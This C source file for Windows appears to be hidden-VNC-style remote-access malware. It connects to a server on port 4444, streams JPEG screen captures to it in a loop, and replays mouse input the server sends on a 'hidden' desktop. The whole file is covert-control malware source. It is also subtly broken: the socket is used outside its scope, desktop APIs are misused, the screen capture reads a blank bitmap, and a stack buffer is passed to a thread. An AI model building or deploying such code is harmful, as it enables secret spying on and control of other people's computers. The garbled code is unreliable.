#include <Windows.h>
#include <Gdiplus.h>

#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "Ws2_32.lib")

#define PORT_DEFAULT 4444
#define HOST_DEFAULT "127.0.0.1"

typedef struct {
  int type;
  int x;
  int y;
} Packet;

// Function prototypes
void SendScreenData(HDC hdc_screen, int screen_width, int screen_height);
DWORD WINAPI DesktopThread(LPVOID param);
DWORD WINAPI InputThread(LPVOID param);
static DWORD WINAPI MainThread(LPVOID param);
HANDLE StartHiddenDesktop(const char* host, int port);
// Send the screen data to the server

void SendScreenData(HDC hdc_screen, int screen_width, int screen_height) {
  // Allocate memory for the screen pixels
  size_t pixel_data_size = screen_width * screen_height * 4;
  unsigned char* pixel_data = (unsigned char*)malloc(pixel_data_size);

  // Capture the screen pixels
  BITMAPINFO bmp_info;
  bmp_info.bmiHeader.biSize = sizeof(bmp_info.bmiHeader);
  bmp_info.bmiHeader.biWidth = screen_width;
  bmp_info.bmiHeader.biHeight = -screen_height;
  bmp_info.bmiHeader.biPlanes = 1;
  bmp_info.bmiHeader.biBitCount = 32;
  bmp_info.bmiHeader.biCompression = BI_RGB;
  GetDIBits(hdc_screen, CreateCompatibleBitmap(hdc_screen, screen_width, screen_height), 0, screen_height, pixel_data, &bmp_info, DIB_RGB_COLORS);

  // Convert the screen pixels to a JPEG image
  IStream* jpeg_stream = NULL;
  CreateStreamOnHGlobal(NULL, TRUE, &jpeg_stream);
  Bitmap bitmap(screen_width, screen_height, screen_width * 4, PixelFormat32bppRGB, pixel_data);
  bitmap.Save(jpeg_stream, &CLSID_JpegEncoder, NULL);
  HGLOBAL jpeg_handle = NULL;
  GetHGlobalFromStream(jpeg_stream, &jpeg_handle);
  void* jpeg_data = GlobalLock(jpeg_handle);
  size_t jpeg_size = GlobalSize(jpeg_handle);

  // Send the JPEG image to the server
  send(sock, (char*)&jpeg_size, sizeof(jpeg_size), 0);
  send(sock, (char*)jpeg_data, jpeg_size, 0);

  // Clean up
  jpeg_stream->Release();
  free(pixel_data);
}

// Desktop thread function
DWORD WINAPI DesktopThread(LPVOID param) {
  // Open a handle to the desktop
  HDESK hdesk_orig = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP);
  HDESK hdesk = OpenDesktop(hdesk_orig, 0, FALSE, DESKTOP_SWITCHDESKTOP | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS | DESKTOP_ENUMERATE | DESKTOP_CREATEWINDOW);

  // Set the desktop to the "hidden" desktop
  HDESK hdesk_hidden = OpenDesktop(hdesk_orig, 0, FALSE, DESKTOP_SWITCHDESKTOP | DESKTOP_CREATEWINDOW);
  SetThreadDesktop(hdesk_hidden);
  SwitchDesktop(hdesk_hidden);

  // Get the dimensions of the desktop
  int screen_width = GetSystemMetrics(SM_CXSCREEN);
  int screen_height = GetSystemMetrics(SM_CYSCREEN);

  // Get a device context for the desktop
  HDC hdc_screen = GetDC(NULL);

  // Enter the desktop loop
  while (1) {
    // Send the screen data to the server
    SendScreenData(hdc_screen, screen_width, screen_height);

    // Sleep for a bit to reduce the load on the system
    Sleep(50);
  }

  // Clean up
  ReleaseDC(NULL, hdc_screen);
  CloseDesktop(hdesk);
  CloseDesktop(hdesk_hidden);
  CloseDesktop(hdesk_orig);
  return 0;
}

// Input thread function
DWORD WINAPI InputThread(LPVOID param) {
  // Open a handle to the desktop
  HDESK hdesk_orig = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP);
  HDESK hdesk = OpenDesktop(hdesk_orig, 0, FALSE, DESKTOP_SWITCHDESKTOP | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS | DESKTOP_ENUMERATE | DESKTOP_CREATEWINDOW);

  // Set the desktop to the "hidden" desktop
  HDESK hdesk_hidden = OpenDesktop(hdesk_orig, 0, FALSE, DESKTOP_SWITCHDESKTOP | DESKTOP_CREATEWINDOW);
  SetThreadDesktop(hdesk_hidden);
  SwitchDesktop(hdesk_hidden);

  // Enter the input loop
  while (1) {
    // Receive a packet from the server
    Packet packet;
    int bytes_received = recv(sock, (char*)&packet, sizeof(packet), 0);
    if (bytes_received == 0) {
      break;
    }

    // Simulate the input event on the desktop
    INPUT input;
    input.type = packet.type;
    input.mi.dx = packet.x;
    input.mi.dy = packet.y;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
    SendInput(1, &input, sizeof(input));
  }

  // Clean up
  CloseDesktop(hdesk);
  CloseDesktop(hdesk_hidden);
  CloseDesktop(hdesk_orig);
  return 0;
}
// Main thread function
static DWORD WINAPI MainThread(LPVOID param) {
  // Parse the host and port arguments
  const char* host = HOST_DEFAULT;
  int port = PORT_DEFAULT;
  if (param != NULL) {
    char* token = strtok(param, ":");
    host = token;
    token = strtok(NULL, ":");
    if (token != NULL) {
      port = atoi(token);
    }
  }

  // Initialize Winsock
  WSADATA wsa_data;
  WSAStartup(MAKEWORD(2, 2), &wsa_data);

  // Create a socket and connect to the server
  SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  SOCKADDR_IN server_addr;
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  server_addr.sin_addr.s_addr = inet_addr(host);
  connect(sock, (SOCKADDR*)&server_addr, sizeof(server_addr));

  // Start the desktop and input threads
  HANDLE hthread_desktop = CreateThread(NULL, 0, DesktopThread, NULL, 0, NULL);
  HANDLE hthread_input = CreateThread(NULL, 0, InputThread, NULL, 0, NULL);

  // Wait for the threads to finish
  WaitForSingleObject(hthread_desktop, INFINITE);
  WaitForSingleObject(hthread_input, INFINITE);

  // Clean up
  closesocket(sock);
  WSACleanup();
  return 0;
}

// Start the hidden desktop
HANDLE StartHiddenDesktop(const char* host, int port) {
  // Create the main thread
  char param[256];
  sprintf(param, "%s:%d", host, port);
  return CreateThread(NULL, 0, MainThread, param, 0, NULL);
}
int main() {
  // Start the hidden desktop
  HANDLE hthread_main = StartHiddenDesktop(HOST_DEFAULT, PORT_DEFAULT);

  // Wait for the main thread to finish
  WaitForSingleObject(hthread_main, INFINITE);
  return 0;
}
